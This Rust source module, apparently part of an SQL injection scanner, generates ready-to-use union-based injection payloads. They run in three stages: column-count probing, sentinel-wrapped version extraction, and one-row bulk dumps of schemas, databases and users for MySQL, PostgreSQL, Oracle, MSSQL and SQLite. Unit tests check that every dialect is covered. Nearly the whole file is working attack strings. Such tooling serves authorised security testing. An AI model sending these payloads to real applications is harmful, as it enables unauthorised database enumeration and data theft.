//! Union-based SQL injection generators.
//!
//! Three stages, in the order a real operator runs them:
//!  1. **Column count** — `ORDER BY n` probing and `UNION SELECT NULL,...`
//!     padding to learn the number of columns the front query selects.
//!  2. **Reflection locator + extraction** — a `UNION SELECT` that wraps a
//!     real value (`version()`, `@@version`, banner) between two sentinel
//!     tokens so the leaked data is unambiguous in the response body.
//!  3. **Bulk aggregation** — one-row exfiltration of an entire column using
//!     each dialect's aggregate (`group_concat`, `string_agg`, `LISTAGG`,
//!     `FOR XML PATH`).
//!
//! `run_payloads` confirms a union injection when [`SENTINEL_HEAD`] appears in
//! the response — i.e. our injected value was rendered back to us.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

/// Leading marker wrapped around extracted values (`0x7176707671`).
pub const SENTINEL_HEAD: &str = "qvpvq";
/// Trailing marker wrapped around extracted values (`0x716b786271`).
pub const SENTINEL_TAIL: &str = "qkxbq";

fn probe(name: &str, payload: &str, dbms: Option<DbmsFamily>, clause: SqlClause) -> GeneratedPayload {
    GeneratedPayload {
        name: name.to_string(),
        probe_type: ProbeType::UnionBased,
        payload_str: payload.to_string(),
        expected_dbms: dbms,
        clause: Some(clause),
    }
}

/// Max columns probed during count discovery.
const MAX_COLS: usize = 8;

pub fn generate() -> Vec<GeneratedPayload> {
    let mut out = Vec::new();
    out.extend(column_count_probes());
    out.extend(extraction_probes());
    out.extend(aggregation_probes());
    out
}

/// Stage 1: learn the column count via ORDER BY and NULL padding.
fn column_count_probes() -> Vec<GeneratedPayload> {
    let mut out = Vec::new();
    for n in 1..=MAX_COLS {
        out.push(probe(
            &format!("union-orderby-{n}"),
            &format!("' ORDER BY {n}-- -"),
            None,
            SqlClause::OrderBy,
        ));
        let nulls = vec!["NULL"; n].join(",");
        out.push(probe(
            &format!("union-nullpad-{n}"),
            &format!("' UNION SELECT {nulls}-- -"),
            None,
            SqlClause::Union,
        ));
    }
    out
}

/// Stage 2: sentinel-wrapped extraction so reflected data is unmistakable.
fn extraction_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    let (h, t) = (SENTINEL_HEAD, SENTINEL_TAIL);
    vec![
        // MySQL/MariaDB — CONCAT.
        probe(
            "union-mysql-extract",
            &format!("' UNION SELECT CONCAT('{h}',version(),'{t}')-- -"),
            Some(MySQL),
            SqlClause::Union,
        ),
        // PostgreSQL / SQLite / Oracle — `||` concatenation.
        probe(
            "union-pg-extract",
            &format!("' UNION SELECT '{h}'||version()||'{t}'-- -"),
            Some(PostgreSQL),
            SqlClause::Union,
        ),
        probe(
            "union-sqlite-extract",
            &format!("' UNION SELECT '{h}'||sqlite_version()||'{t}'-- -"),
            Some(SQLite),
            SqlClause::Union,
        ),
        probe(
            "union-oracle-extract",
            &format!("' UNION SELECT '{h}'||banner||'{t}' FROM v$version WHERE rownum=1-- -"),
            Some(Oracle),
            SqlClause::Union,
        ),
        // MSSQL — `+` concatenation.
        probe(
            "union-mssql-extract",
            &format!("' UNION SELECT '{h}'+@@version+'{t}'-- -"),
            Some(MSSQL),
            SqlClause::Union,
        ),
    ]
}

/// Stage 3: one-shot bulk column exfiltration via dialect aggregates.
fn aggregation_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        probe(
            "union-mysql-schemas",
            "' UNION SELECT group_concat(schema_name SEPARATOR 0x2c) FROM information_schema.schemata-- -",
            Some(MySQL),
            SqlClause::Union,
        ),
        probe(
            "union-pg-databases",
            "' UNION SELECT string_agg(datname,',') FROM pg_database-- -",
            Some(PostgreSQL),
            SqlClause::Union,
        ),
        probe(
            "union-oracle-users",
            "' UNION SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users-- -",
            Some(Oracle),
            SqlClause::Union,
        ),
        probe(
            "union-mssql-databases",
            "' UNION SELECT STRING_AGG(name,',') FROM sys.databases-- -",
            Some(MSSQL),
            SqlClause::Union,
        ),
        probe(
            "union-sqlite-tables",
            "' UNION SELECT group_concat(name,',') FROM sqlite_master-- -",
            Some(SQLite),
            SqlClause::Union,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn discovers_and_extracts() {
        let payloads = generate();
        assert!(payloads.iter().any(|p| p.name.starts_with("union-orderby-")));
        assert!(payloads.iter().any(|p| p.name.starts_with("union-nullpad-")));
        assert!(payloads.iter().any(|p| p.payload_str.contains(SENTINEL_HEAD)));
    }

    #[test]
    fn extraction_probes_wrap_both_sentinels() {
        for p in extraction_probes() {
            assert!(p.payload_str.contains(SENTINEL_HEAD), "no head in {}", p.payload_str);
            assert!(p.payload_str.contains(SENTINEL_TAIL), "no tail in {}", p.payload_str);
        }
    }

    #[test]
    fn aggregation_covers_major_dbms() {
        let agg = aggregation_probes();
        for fam in [DbmsFamily::MySQL, DbmsFamily::PostgreSQL, DbmsFamily::MSSQL, DbmsFamily::Oracle, DbmsFamily::SQLite] {
            assert!(agg.iter().any(|p| p.expected_dbms == Some(fam)), "no aggregate for {fam:?}");
        }
    }

    #[test]
    fn all_union_based() {
        assert!(generate().iter().all(|p| p.probe_type == ProbeType::UnionBased));
    }
}

